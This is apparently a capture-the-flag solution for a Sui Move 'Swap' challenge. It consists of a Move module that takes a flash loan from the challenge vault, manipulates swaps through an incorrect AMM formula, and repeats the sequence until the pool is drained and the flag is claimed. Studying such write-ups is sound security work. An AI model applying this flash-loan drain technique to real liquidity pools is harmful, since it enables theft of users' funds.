# Swap

Exploit incorrect AMM formula

```move
module solve::m {
    use sui::tx_context::{Self, TxContext};
    use swap::vault::{Self, Vault};
    use swap::ctfa::{Self, MintA};
    use swap::ctfb::{Self, MintB};
    use sui::balance::{Self, Balance};
    use sui::coin::{Self, Coin};
    use std::vector;

    public entry fun initialize<A,B>(minta: MintA<A>, mintb: MintB<B>, ctx: &mut TxContext) {
        vault::initialize<A,B>(minta, mintb, ctx);
    }

    public entry fun solve<A,B>(vault: &mut Vault<A,B>, ctx: &mut TxContext) {
        let (coin_a, coin_b, receipt) = vault::flash<A,B>(vault, 50, false, ctx);
        let balance_a = coin::into_balance(coin_a);
        let balance_b = coin::into_balance(coin_b);
        // attacker: 50, 0; vault: 50, 100
        assert!(balance::value(&balance_a) == 50, 1);
        assert!(balance::value(&balance_b) == 0, 2);
        let coin_b = vault::swap_a_to_b<A,B>(vault, coin::from_balance(balance::split(&mut balance_a,40),ctx), ctx);
        balance::join(&mut balance_b, coin::into_balance(coin_b));
        assert!(balance::value(&balance_a) == 10, 3);
        assert!(balance::value(&balance_b) == 80, 4);
        // attacker: 10, 80; vault: 90, 20
        let coin_a = vault::swap_b_to_a<A,B>(vault, coin::from_balance(balance::split(&mut balance_b,20),ctx), ctx);
        balance::join(&mut balance_a, coin::into_balance(coin_a));
        assert!(balance::value(&balance_a) == 100, 5);
        assert!(balance::value(&balance_b) == 60, 6);
        // attacker: 100, 60; vault: 0, 40
        vault::repay_flash<A,B>(vault, coin::from_balance(balance::split(&mut balance_a, 50), ctx), coin::zero<B>(ctx), receipt);
        assert!(balance::value(&balance_a) == 50, 7);
        assert!(balance::value(&balance_b) == 60, 8);
        // attacker: 50, 60; vault: 50, 40
        let coin_b = vault::swap_a_to_b<A,B>(vault, coin::from_balance(balance::split(&mut balance_a,50),ctx), ctx);
        balance::join(&mut balance_b, coin::into_balance(coin_b));
        assert!(balance::value(&balance_a) == 0, 9);
        assert!(balance::value(&balance_b) == 100, 10);
        // attacker: 0, 100; vault: 100, 0
        let (coin_a, coin_b, receipt) = vault::flash<A,B>(vault, 100, false, ctx);
        balance::join(&mut balance_a, coin::into_balance(coin_a));
        balance::join(&mut balance_b, coin::into_balance(coin_b));
        vault::get_flag<A,B>(vault, ctx);
        vault::repay_flash<A,B>(vault, coin::from_balance(balance_a, ctx), coin::from_balance(balance_b, ctx), receipt);
    }
}
```